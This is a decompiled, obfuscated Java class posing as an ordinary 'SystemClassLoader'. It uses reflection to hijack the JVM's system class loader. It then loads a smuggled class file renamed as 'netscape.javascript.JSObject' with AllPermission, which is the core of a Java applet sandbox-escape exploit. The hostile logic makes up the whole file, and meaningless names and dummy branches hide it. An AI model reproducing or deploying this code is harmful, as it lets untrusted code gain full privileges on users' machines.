package app;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

final class SystemClassLoader extends ClassLoader {
	private static ClassLoader a;
	private static SystemClassLoader b;

	static final void a(byte var0) {
		if (var0 >= 126) {
			b = new SystemClassLoader();
			b.b((byte) -122);
		}
	}

	public SystemClassLoader() {
	}

	public final Class loadClass(String var1) throws ClassNotFoundException {
		boolean var13 = Preferences.c;
		if ("netscape.javascript.JSObject".equals(var1)) {
			CodeSource var2 = new CodeSource((URL) null, (Certificate[]) null);
			Permissions var3 = new Permissions();
			var3.add(new AllPermission());
			ProtectionDomain var4 = new ProtectionDomain(var2, var3);

			try {
				URL var5 = this.getClass().getClassLoader().getResource("netscape/javascript/JSObjec_.class");
				URLConnection var6 = var5.openConnection();
				InputStream var7 = var6.getInputStream();
				byte[] var8 = new byte[var6.getContentLength()];
				int var9 = 0;

				while (~var9 > ~var8.length) {
					var9 += var7.read(var8, var9, var8.length - var9);
					if (var13) {
						break;
					}
				}

				int var10 = 0;

				while (~var10 > ~var8.length) {
					int var11 = var8[var10] & 255;
					if ("JSObject".charAt(0) == var11) {
						int var12 = 1;

						while (var10 + var12 < var8.length) {
							if (~(-1 + "JSObject".length()) == ~var12) {
								var8[var10 + var12] = (byte) "JSObject".charAt(var12);
								if (!var13) {
									break;
								}
							}

							var11 = var8[var12 - -var10] & 255;
							if (var11 != "JSObject".charAt(var12)) {
								break;
							}

							++var12;
							if (var13) {
								break;
							}
						}
					}

					++var10;
					if (var13) {
						break;
					}
				}

				Class var16 = this.defineClass(var1, var8, 0, var8.length, var4);
				return var16;
			} catch (IOException var15) {
				var15.printStackTrace();
			}
		}

		try {
			return this.getClass().getClassLoader().loadClass(var1);
		} catch (Exception var14) {
			return a.loadClass(var1);
		}
	}

	private final void b(byte var1) {
		try {
			a = ClassLoader.getSystemClassLoader();
			Field var2 = ClassLoader.class.getDeclaredField("scl");
			var2.setAccessible(true);
			if (var1 >= -97) {
				return;
			}

			var2.set(a, this);
			var2.setAccessible(false);
		} catch (Throwable var3) {
		}

	}
}
